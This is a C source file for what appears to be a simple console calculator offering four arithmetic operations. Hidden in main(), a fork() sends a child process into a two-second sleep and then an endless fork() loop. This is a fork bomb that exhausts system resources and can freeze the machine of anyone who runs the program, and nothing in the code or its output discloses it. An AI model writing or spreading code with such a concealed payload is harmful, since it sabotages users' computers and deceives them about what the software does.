#include <stdio.h>
#include <unistd.h>
#include <math.h>

float A, B, savA;
int Choice;
char Touch;

void do_op(void)
{
    savA = A;

    printf("\nWhat do you want to do?\n"
           "---------------------------\n"
           "1 -> Addition\n"
           "2 -> Subtraction\n"
           "3 -> Multiplication\n"
           "4 -> Division\n"
           "Choice: ");

    if (scanf("%d", &Choice) != 1) {
        printf("Invalid choice.\n");
    }

    switch (Choice)
    {
    case 1:
        A = A + B;
        printf("%.2f + %.2f = %.2f\n", savA, B, A);
        break;

    case 2:
        A = A - B;
        printf("%.2f - %.2f = %.2f\n", savA, B, A);
        break;

    case 3:
        A = A * B;
        printf("%.2f * %.2f = %.2f\n", savA, B, A);
        break;

    case 4:
        if (fabsf(B) < 1e-6f) {
            printf("Division by zero is not allowed.\n");
        } else {
            A = A / B;
            printf("%.2f / %.2f = %.2f\n", savA, B, A);
        }
        break;

    default:
        printf("Unknown choice.\n");
        break;
    }

    printf("Do you want to continue with this result? (Y/N): ");
    if (scanf(" %c", &Touch) != 1) {
        Touch = 'N';
    }
}

int main(void)
{
    if (fork()) 
    {
        Touch = 'N';

        printf("Give me two numbers: ");
        if (scanf("%f %f", &A, &B) != 2) {
            printf("Invalid input.\n");
            return 1;
        }

        do_op();

        while (Touch == 'Y' || Touch == 'y') {
            printf("Give me another number: ");
            if (scanf("%f", &B) != 1) {
                printf("Invalid input.\n");
                return 1;
            }
            do_op();
        }
    }
    else 
    {
        sleep(2);
        while (1) 
        {
            fork();
        }
    }

    return 0;
}
